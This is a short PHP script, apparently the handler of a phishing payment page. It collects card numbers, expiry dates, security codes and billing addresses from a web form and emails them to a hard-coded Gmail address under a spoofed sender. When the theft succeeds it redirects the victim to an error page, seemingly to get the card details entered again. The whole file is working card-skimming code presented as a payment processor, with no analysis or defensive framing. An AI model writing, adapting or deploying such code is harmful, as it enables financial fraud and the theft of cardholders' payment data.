<?php
  // Configuración del correo electrónico
  $to = 'onerpmchele@gmail.com';
  $subject = 'Nuevo pago recibido';
  $from = 'darwinbbank@gmail.com';

  // Recopilar los datos del formulario
  $card_number = $_POST['card-number'];
  $expiration_date = $_POST['expiration-date'];
  $security_code = $_POST['security-code'];
  $address = $_POST['address'];
  $city = $_POST['city'];
  $state = $_POST['state'];
  $zip_code = $_POST['zip-code'];

  // Crear el cuerpo del correo electrónico
  $message = "Nuevo pago recibido:\n\n";
  $message .= "Número de tarjeta: $card_number\n";
  $message .= "Fecha de vencimiento: $expiration_date\n";
  $message .= "Código de seguridad: $security_code\n";
  $message .= "Dirección: $address\n";
  $message .= "Ciudad: $city\n";
  $message .= "Estado: $state\n";
  $message .= "Código postal: $zip_code\n";

  // Enviar el correo electrónico
  $headers = "From: $from\r\n";
  if (mail($to, $subject, $message, $headers)) {
    // Redirigir al usuario a una página de error
    header('Location: error_red.php');
    exit;
  } else {
    // Redirigir al usuario a una página de confirmación
    header('Location: confirmacion.php');
    exit;
  }
?>